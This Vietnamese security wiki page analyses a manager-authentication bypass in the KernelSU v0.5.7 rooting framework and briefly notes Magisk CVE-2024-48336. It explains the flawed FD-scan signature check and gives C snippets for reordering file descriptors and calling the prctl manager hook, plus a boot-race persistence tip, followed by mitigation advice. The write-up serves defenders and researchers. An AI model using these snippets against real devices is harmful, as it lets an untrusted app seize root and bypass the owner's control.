# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Các rooting framework như KernelSU, APatch và SKRoot vá hoặc hook kernel Android/Linux, đồng thời cung cấp chức năng đặc quyền cho ứng dụng manager userspace không có đặc quyền. Magisk được thảo luận riêng bên dưới vì CVE-2024-48336 liên quan đến việc nạp mã phía manager, chứ không phải đường đi syscall của KernelSU.<sup>[[1]](#references)[[5]](#references)[[13]](#references)</sup>

Trang này khái quát các kỹ thuật và vấn đề cần lưu ý được phát hiện trong các nghiên cứu công khai (đáng chú ý là phân tích của Zimperium về KernelSU v0.5.7), nhằm giúp cả red team và blue team hiểu bề mặt tấn công, primitive khai thác và các biện pháp giảm thiểu hiệu quả.<sup>[[1]](#references)</sup>

---
## Mẫu kiến trúc: kênh manager dùng syscall hook

- Trong KernelSU v0.5.7, một kernel hook trên `prctl` nhận giá trị magic, command ID và các đối số riêng của command từ userspace.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
- Caller trước tiên yêu cầu trạng thái manager bằng `CMD_BECOME_MANAGER`. Việc cấp quyền phụ thuộc vào từng command: `CMD_GRANT_ROOT` kiểm tra trạng thái manager/allowlist, `CMD_ALLOW_SU` chỉ dành cho manager, còn `CMD_SET_SEPOLICY` chỉ dành cho root trong phiên bản này.<sup>[[2]](#references)[[11]](#references)</sup>
- Các command khác truy vấn version/configuration hoặc báo cáo sự kiện framework.<sup>[[2]](#references)</sup>
- Vì bất kỳ app nào cũng có thể gọi giao diện syscall này, việc xác thực manager chính xác là rất quan trọng.<sup>[[1]](#references)[[2]](#references)</sup>

Ví dụ (thiết kế KernelSU):
- Syscall được hook: prctl
- Giá trị magic để chuyển hướng đến handler của KernelSU: 0xDEADBEEF
- Các command gồm: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, v.v.<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

---
## Luồng xác thực của KernelSU v0.5.7 (theo cách triển khai)

Khi userspace gọi prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU xác minh:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>

1) Kiểm tra tiền tố đường dẫn
- Đường dẫn được cung cấp phải bắt đầu bằng tiền tố dự kiến cho UID của caller, ví dụ /data/data/<pkg> hoặc /data/user/<id>/<pkg>.
  - Tham khảo: logic kiểm tra tiền tố đường dẫn trong core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Kiểm tra quyền sở hữu
- Đường dẫn phải thuộc sở hữu của UID caller.
  - Tham khảo: logic kiểm tra quyền sở hữu trong core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Kiểm tra chữ ký APK thông qua quét bảng FD
- Duyệt các file descriptor đang mở của process gọi theo thứ tự descriptor tăng dần.
- Với mỗi file thông thường có đường dẫn bắt đầu bằng `/data/app/` và kết thúc bằng `/base.apk`, yêu cầu đường dẫn phải chứa chuỗi package được lấy từ đường dẫn data directory đã cung cấp.
- Xác minh chữ ký của candidate đầu tiên thỏa mãn các kiểm tra đường dẫn đó.
- Phân tích chữ ký APK v2 và xác minh với certificate chính thức của manager.
  - Tham khảo: manager.c (duyệt FD), apk_sign.c (xác minh APK v2).<sup>[[3]](#references)[[4]](#references)</sup>

Nếu tất cả kiểm tra đều đạt, kernel tạm thời cache UID của manager; sau đó, các command chỉ dành cho manager chấp nhận UID đó, trong khi các command khác vẫn áp dụng kiểm tra UID hoặc allowlist riêng.<sup>[[2]](#references)[[3]](#references)</sup>

---
## Nhóm lỗ hổng: tin cậy việc chọn APK dựa trên đường dẫn

KernelSU v0.5.7 không liên kết kết quả xác minh chữ ký với danh tính package đã cài đặt trong PackageManager. Trong `manager.c`, kiểm tra package chỉ là kiểm tra chuỗi con trong đường dẫn (`strstr(cwd, pkg)`); candidate đầu tiên vượt qua bước kiểm tra này sẽ được xác minh chữ ký. Do đó, attacker có thể đặt một manager APK chính hãng dưới đường dẫn `/data/app/` cũng chứa tên package của attacker, rồi sắp xếp để APK đó được chọn trước.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>

Kiểu tin cậy thông qua trung gian này cho phép app không có đặc quyền giả mạo manager mà không cần sở hữu signing key của manager.<sup>[[1]](#references)</sup>

Các đặc tính bị khai thác:<sup>[[1]](#references)[[3]](#references)</sup>
- Việc quét FD theo thứ tự chỉ số descriptor và kiểm tra package bằng chuỗi con trong đường dẫn, chứ không xác minh mối liên kết giữa package và danh tính APK.
- open() trả về FD khả dụng có số nhỏ nhất. Bằng cách đóng các FD có số thấp trước, attacker có thể kiểm soát thứ tự.
- Có thể đặt một manager APK đi kèm dưới `/data/app/` tại đường dẫn chứa chuỗi package của attacker mà vẫn giữ chữ ký chính thức của manager.

---
## Điều kiện khai thác

Trường hợp KernelSU v0.5.7 cụ thể cần:<sup>[[1]](#references)[[3]](#references)</sup>

- Thiết bị đã được root bằng một rooting framework có lỗ hổng (ví dụ: KernelSU v0.5.7).
- Attacker có thể chạy tùy ý code không có đặc quyền cục bộ (trong process Android app).
- Với cách triển khai v0.5.7, `current->real_parent` phải có UID 0 (comment trong source mô tả đây là yêu cầu tiến trình con trực tiếp của zygote); `manager.c` từ chối các parent khác.<sup>[[3]](#references)</sup>
- Manager thực chưa xác thực (ví dụ: ngay sau khi khởi động lại). Một số framework cache UID của manager sau khi xác thực thành công; cần thắng cuộc đua này.<sup>[[1]](#references)</sup>

---
## Phác thảo khai thác (KernelSU v0.5.7)

Các bước ở mức khái quát (video demo được trích dẫn cho thấy proof of concept công khai đang hoạt động):<sup>[[1]](#references)[[2]](#references)[[10]](#references)</sup>
1) Tạo đường dẫn hợp lệ đến thư mục dữ liệu app của bạn để vượt qua kiểm tra tiền tố và quyền sở hữu.
2) Đặt một KernelSU Manager base.apk chính hãng dưới `/data/app/` tại đường dẫn chứa chuỗi package của bạn, rồi mở file này bằng FD có số nhỏ hơn FD của base.apk của bạn.
3) Gọi prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) để vượt qua các bước kiểm tra.
4) Dùng `CMD_GRANT_ROOT`, sau đó dùng `CMD_ALLOW_SU` để duy trì su; chỉ gọi `CMD_SET_SEPOLICY` dành riêng cho root sau khi có quyền root và chỉ khi tính năng đó được hỗ trợ.

Ghi chú thực tế về bước 2 (thứ tự FD):<sup>[[1]](#references)</sup>
- Xác định FD của process bạn trỏ đến /data/app/*/base.apk bằng cách duyệt các symlink trong /proc/self/fd.
- Đóng một FD số thấp (ví dụ stdin, fd 0), rồi mở manager APK hợp lệ trước để file này chiếm fd 0 (hoặc bất kỳ chỉ số nào nhỏ hơn FD của base.apk của bạn).
- Đóng gói manager APK hợp lệ cùng app để đường dẫn của nó bắt đầu bằng `/data/app/`, kết thúc bằng `/base.apk` và chứa chuỗi package của bạn. Ví dụ, một đường dẫn bên trong thư mục `lib` của app có thể đáp ứng các kiểm tra này.<sup>[[1]](#references)[[3]](#references)</sup>

Các đoạn code ví dụ (Android/Linux, chỉ mang tính minh họa):

Liệt kê các FD đang mở để tìm các mục base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
    DIR *d = opendir("/proc/self/fd");
    if (!d) return -1;
    struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
    int best_fd = -1;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;
        int fd = atoi(e->d_name);
        snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
        ssize_t n = readlink(link, p, sizeof(p)-1);
        if (n <= 0) continue; p[n] = '\0';
        if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
            if (best_fd < 0 || fd < best_fd) {
                best_fd = fd; strncpy(out_path, p, PATH_MAX);
            }
        }
    }
    closedir(d);
    return best_fd; // First (lowest) matching fd
}
```

Buộc FD có số nhỏ hơn trỏ đến APK manager hợp lệ:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
    // Reuse stdin (fd 0) if possible so the next open() returns 0
    close(0);
    int fd = open(legit_apk_path, O_RDONLY);
    (void)fd; // fd should now be 0 if available
}
```

Xác thực Manager thông qua hook `prctl` của KernelSU v0.5.7:<sup>[[1]](#references)[[2]](#references)[[11]](#references)</sup>
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 1  // KernelSU v0.5.7; other frameworks differ

int become_manager(const char *my_data_dir) {
    uint32_t reply = 0;
    // arg3: data path; arg4: unused; arg5: userspace result pointer
    (void)prctl(KSU_MAGIC, CMD_BECOME_MANAGER,
                (unsigned long)my_data_dir, 0UL,
                (unsigned long)&reply);
    return reply == KSU_MAGIC ? 0 : -1;
}
```

Sau khi thành công, các lệnh có đặc quyền (ví dụ):<sup>[[2]](#references)[[11]](#references)</sup>
- CMD_GRANT_ROOT: nâng tiến trình hiện tại lên quyền root
- CMD_ALLOW_SU: thêm package/UID của bạn vào allowlist để duy trì quyền su
- CMD_SET_SEPOLICY: điều chỉnh chính sách SELinux sau khi có quyền root; KernelSU v0.5.7 kiểm tra UID 0 đối với lệnh này.<sup>[[2]](#references)</sup>

Mẹo về race/persistence:
- Đăng ký receiver BOOT_COMPLETED trong AndroidManifest (`RECEIVE_BOOT_COMPLETED`) để khởi chạy sau khi khởi động lại và thử xác thực trước manager chính thức; quyền này cho phép nhận `ACTION_BOOT_COMPLETED` nhưng không tự đảm bảo được ưu tiên lập lịch.<sup>[[1]](#references)[[12]](#references)</sup>

---
## Hướng dẫn phát hiện và giảm thiểu

Dành cho nhà phát triển framework:
- Gắn xác thực với package/UID của caller, không phải với các FD tùy ý:
  - Tra cứu package của caller từ UID và xác minh chữ ký của package đã cài đặt (thông qua PackageManager), thay vì quét FD.
  - Nếu chỉ xử lý trong kernel, hãy dùng danh tính ổn định của caller (task creds) và xác thực dựa trên một nguồn dữ liệu đáng tin cậy, ổn định do init/helper ở userspace quản lý, không phải các FD của tiến trình.
- Không dùng kiểm tra tiền tố đường dẫn làm danh tính; caller có thể dễ dàng thỏa mãn điều kiện này.
- Dùng challenge–response dựa trên nonce qua kênh và xóa mọi danh tính manager đã lưu trong cache khi khởi động hoặc khi có sự kiện quan trọng.
- Cân nhắc dùng IPC có xác thực dựa trên binder thay vì tận dụng syscall tổng quát khi khả thi.

Dành cho đội ngũ phòng thủ/blue team:
- Phát hiện sự hiện diện của rooting framework và tiến trình manager; theo dõi các lệnh gọi prctl có magic constant đáng ngờ (ví dụ: 0xDEADBEEF) nếu bạn có telemetry từ kernel.<sup>[[1]](#references)[[11]](#references)</sup>
- Trên các nhóm thiết bị được quản lý, hãy chặn hoặc cảnh báo khi receiver khởi động từ package không đáng tin cậy nhanh chóng thử thực thi các lệnh manager có đặc quyền sau khi khởi động.
- Đảm bảo thiết bị được cập nhật lên phiên bản framework đã vá; vô hiệu hóa các manager ID đã lưu trong cache khi cập nhật.

Hạn chế của cuộc tấn công:<sup>[[1]](#references)[[2]](#references)</sup>
- Chỉ ảnh hưởng đến thiết bị đã root bằng framework có lỗ hổng.
- Thường cần khởi động lại/khoảng thời gian race trước khi manager hợp pháp xác thực (một số framework lưu UID của manager trong cache cho đến khi được đặt lại).

---
## Ghi chú liên quan giữa các framework

- Cơ chế xác thực bằng mật khẩu (ví dụ: các bản dựng APatch/SKRoot trước đây) có thể yếu nếu mật khẩu dễ đoán/có thể brute-force hoặc quá trình xác thực có lỗi.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- Cơ chế xác thực dựa trên package/chữ ký (ví dụ: KernelSU) về nguyên tắc mạnh hơn, nhưng phải gắn với caller thực sự, không phải các artefact suy ra từ đường dẫn được chọn thông qua quét FD.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Magisk: CVE-2024-48336 ảnh hưởng đến các bản dựng trước Canary 27007, vốn tải mã từ package GMS chưa được xác minh, cho phép ứng dụng cục bộ thực thi mã trong ứng dụng Magisk và leo thang lên root mà không cần tương tác của người dùng.<sup>[[8]](#references)[[9]](#references)[[13]](#references)</sup>

---
## References

- [1] [Zimperium – Sự thống trị của root: Lỗ hổng bảo mật có thể xâm phạm thiết bị di động của bạn](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – các kiểm tra xác thực trong core_hook.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L149-L205)
- [3] [KernelSU v0.5.7 – duyệt FD, kiểm tra package và lời gọi xác minh chữ ký trong manager.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L16-L67)
- [4] [KernelSU v0.5.7 – xác minh APK v2 trong apk_sign.c](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/apk_sign.c#L6-L119)
- [5] [Dự án KernelSU](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [Vấn đề #8279 của Magisk – Xác minh GMS là ứng dụng hệ thống](https://github.com/topjohnwu/Magisk/issues/8279)
- [9] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [10] [Video demo KSU PoC (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)
- [11] [KernelSU v0.5.7 – các định danh lệnh trong ksu.h](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/ksu.h#L12-L24)
- [12] [Android Manifest.permission.RECEIVE_BOOT_COMPLETED](https://developer.android.com/reference/android/Manifest.permission#RECEIVE_BOOT_COMPLETED)
- [13] [NVD – CVE-2024-48336](https://nvd.nist.gov/vuln/detail/CVE-2024-48336)
{{#include ../../banners/hacktricks-training.md}}
